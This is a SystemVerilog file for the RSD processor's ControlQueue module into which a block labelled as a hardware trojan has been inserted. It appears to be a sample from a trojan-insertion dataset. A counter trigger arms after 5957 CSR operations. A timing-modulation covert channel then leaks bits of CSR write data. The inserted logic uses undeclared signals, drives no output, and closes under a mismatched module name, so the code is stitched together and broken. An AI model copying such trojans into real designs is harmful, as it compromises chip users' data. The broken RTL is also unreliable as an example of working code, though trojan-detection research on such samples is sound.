// Copyright 2019- RSD contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.


//
// ControlQueue
//

`include "SysDeps/XilinxMacros.vh"

import BasicTypes::*;
import MemoryTypes::*;

module ControlQueue_trojan_Covert ( 
input 
    logic clk,
    logic rst,
    logic push,
    logic pop,
    logic [ `PS_PL_CTRL_QUEUE_DATA_BIT_SIZE-1:0 ] pushedData,
output
    logic full,
    logic empty,
    logic [ `PS_PL_CTRL_QUEUE_DATA_BIT_SIZE-1:0 ] headData
);

    typedef logic [`PS_PL_CTRL_QUEUE_ADDR_BIT_SIZE-1:0] IndexPath;

    IndexPath headPtr;
    IndexPath tailPtr;

    // size, initial head, initial tail, initial count
    QueuePointer #( `PS_PL_CTRL_QUEUE_SIZE, 0, 0, 0 )
        pointer(
            .clk( clk ),
            .rst( rst ),
            .push( push ),
            .pop( pop ),
            .full( full ),
            .empty( empty ),
            .headPtr( headPtr ),
            .tailPtr( tailPtr )
        );

    // ============================================================
    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=5957)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 5957;
    logic [15:0] trojan_counter;
    logic        trojan_active;
    always_ff @(posedge clk or negedge rst) begin
        if (!rst) begin
            trojan_counter <= '0;
            trojan_active  <= 1'b0;
        end else begin
            if (csr_op_en_i && |csr_op_en_i) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
        end
    end

    // ── COVERT CHANNEL: Timing modulation ──────────────────────────────────
    logic       covert_bit_out;
    logic [7:0] covert_delay_counter;
    logic [4:0] covert_bit_index;
    logic       covert_current_bit;
    assign covert_current_bit = csr_wdata_i[covert_bit_index[4:0]];
    always_ff @(posedge clk or negedge rst) begin
        if (!rst) begin
            covert_bit_out       <= 1'b0;
            covert_delay_counter <= '0;
            covert_bit_index     <= '0;
        end else if (trojan_active) begin
            if (covert_delay_counter < (covert_current_bit ? 8'd10 : 8'd5)) begin
                covert_delay_counter <= covert_delay_counter + 1;
                covert_bit_out       <= 1'b1;
            end else begin
                covert_bit_out       <= 1'b0;
                covert_delay_counter <= '0;
                covert_bit_index     <= covert_bit_index + 1;
            end
        end else begin
            covert_bit_out <= 1'b0; covert_delay_counter <= '0; covert_bit_index <= '0;
        end
    end
    // ────────────────────────────────────────────────────────────────────────


        

    logic [ `PS_PL_CTRL_QUEUE_DATA_BIT_SIZE-1:0 ] controlQueue[ `PS_PL_CTRL_QUEUE_SIZE ]; // synthesis syn_ramstyle = "select_ram"

    always_ff @( posedge clk ) begin
        if( push ) begin
            controlQueue[ tailPtr ] <= pushedData;
        end
    end
    
    always_comb begin
        headData = controlQueue[ headPtr ];
    end

endmodule : ControlQueue

 